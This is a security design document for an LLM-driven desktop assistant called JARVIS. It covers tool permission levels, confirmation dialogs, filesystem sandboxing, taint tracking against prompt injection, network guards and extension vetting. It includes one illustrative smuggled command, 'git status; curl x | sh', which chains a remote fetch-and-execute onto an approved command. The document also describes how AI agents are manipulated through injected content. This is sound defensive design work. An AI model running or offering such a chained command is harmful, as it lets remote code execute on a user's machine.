# Security Model

> Status: design approved; §1 (permission engine + confirmation) implemented in M4.2, §2-§3 pending. This document is normative — code that disagrees with it is wrong, and where implementation forced a change the document was amended rather than quietly diverged from (see §1's dialog note).

JARVIS runs shell commands, reads files, and fetches web pages, driven by an LLM that can be manipulated by anything it reads. We treat that as the threat model, not an edge case. We also say plainly what this is: **policy enforcement in a trusted process**, not OS-level sandboxing (no seccomp / sandbox-exec in v1).

## 1. Tool permission model

Every tool has a risk level: `safe` / `ask` / `dangerous`.

- `safe` (e.g. `list_dir`, `send_notification`): runs freely.
- `ask` (e.g. `write_file`, `get_clipboard` — yes, clipboard is `ask`: clipboards contain passwords): confirmation dialog showing the exact action and arguments.
- `dangerous` (e.g. `delete`, anything network-writing): per-call confirmation, globally disableable (`[tools] allow_dangerous` in config.toml; off means refused without even asking).

`run_command` **always confirms, full command text shown, no exceptions.** There is no command classifier and no denylist — both are bypass generators. A future opt-in allowlist may skip confirmation for *exact-match* previously-approved commands only.

### The dialog is in-app, not a native OS dialog (amended M4.2)

This document originally specified a native OS dialog. It is a React modal instead, and the reason is that native would not have bought the property it was there for.

The confirmation originates in the Python backend and the answer returns over the same WebSocket. Driving `tauri-plugin-dialog` from the webview makes the path backend → WS → **webview** → IPC → Rust → OS dialog → **webview** → WS → backend: a compromised webview simply skips the `invoke` and replies "allowed". The webview stays in the trust path either way, so the native dialog is ceremony with real costs — two buttons only (no "allow for this session"), no API to put default focus on Cancel, a zenity/XDG-portal dependency on Linux where a missing dialog fails into deny, no monospace or scrolling for a long command, and undriveable by the headless verification this project relies on. The only variant that genuinely removes the webview is Rust holding its own authenticated socket to the sidecar, which is a second IPC surface that dies in any browser-hosted build.

**What actually carries the security here is identical for both, and is normative:**

- The **backend** mints the correlation id. A confirmation is only ever *requested* by the backend, never *asserted* by a client — there is no message a client can send that approves something out of nowhere.
- Ids are **single-use**. Unknown or already-settled ids are dropped in silence (a second window answering is ordinary traffic, not an error).
- **Absence of an answer is a deny.** No UI connected, every send failed, timeout elapsed, broker raised — all refuse. There is no path where "we couldn't ask" becomes "go ahead".
- The request is **broadcast to every connection**, never the newest one: reloads leave authenticated zombie connections behind, and a stale page must not be able to swallow a confirmation.
- A cancelled generation **dismisses its dialog**. A dialog that outlives the call it asked about is how a user is trained to click Allow without reading.

### "Allow for this session"

Keyed on **tool + exact arguments** (canonical JSON), held in process memory, never written to disk — restarting the backend forgets everything, which is the promise the phrase makes. Approving `git status` therefore does not approve `git status; curl x | sh`. This is the same "exact-match previously-approved" rule stated above for `run_command`.

It is **never honoured for `dangerous`**, which is per-call confirmation and means it. The UI hides the button there, and the backend refuses to record the grant regardless — the button is in a webview and the enforcement is not.

A refusal is also remembered for the rest of the exchange, so a model that re-asks after being told no cannot manufacture a second dialog. That is confirmation fatigue with no attacker in it.

### `JARVIS_DEV_TOOLS` (development affordance)

With `JARVIS_DEV_TOOLS=1` the registry gains an `ask`-risk `echo` tool whose body returns its own argument. It exists because the permission engine ships a milestone ahead of the first tool that needs it, and a dialog never seen in the real webview is not a verified dialog. It grants no capability — it is a mirror — and it passes through the full gate like anything else. The packaged app never sets the variable.

## 2. Filesystem sandbox

Filesystem tools operate only under user-configured roots. Enforcement happens on **`Path.resolve()`-ed (symlink-resolved) absolute paths** — checking the path the user typed is not enforcement. Escaping requires explicit per-path user opt-in. The extensions directory and JARVIS's own config/data directories are **permanently outside** all sandbox roots, so no tool can self-escalate by writing an extension or editing permissions.

## 3. Taint tracking (prompt-injection defense)

Delimiters around untrusted content are labeling, not defense. The mechanism:

- Content from `web_fetch`, `web_search` results, or files outside a trusted set marks the conversation **tainted**.
- From that point, *every* side-effectful tool call — regardless of its normal risk level — escalates to explicit confirmation, and the dialog says why ("this request follows content from example.com").
- Enforced in the tool-execution layer (`backend/jarvis_backend/security/taint.py`), never in the prompt.

## 4. Network guards

- `web_fetch` blocks private/link-local ranges by default (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) — resolved-IP checked, not hostname-checked.
- Backend binds `127.0.0.1` only. WebSocket requires a per-session token *and* a strict `Origin` check (defeats browser drive-bys against localhost).

## 5. Extensions

- Manifest declares platforms, required OS permissions, and per-tool risk levels. The approval dialog at install/load shows **declared permissions**, not just source code (nobody reads 500 lines of source; everybody reads "wants: calendar access, network").
- `jarvis install <url>` pins the commit SHA at install. **No extension auto-update.**
- Extension-declared risk levels are floors, not ceilings — the core permission engine can raise them, never lower.

## 6. Credentials, screen, telemetry

- API keys never appear in prompts, logs, or exports. (Enforced by redaction at the config boundary.)
- `take_screenshot` with a **cloud backend** active warns explicitly: your screen is about to leave this machine.
- Telemetry: none. The model catalog is bundled data; refreshing it is a manual, explicit action — no automatic phone-home, ever.

## Known limitations (v1, documented on purpose)

- Same-process policy enforcement: a bug in the backend is a bug in the sandbox.
- TOCTOU windows between path resolution and file operation.
- Confirmation fatigue is a real attack surface; UX must keep confirmations rare enough to be read.
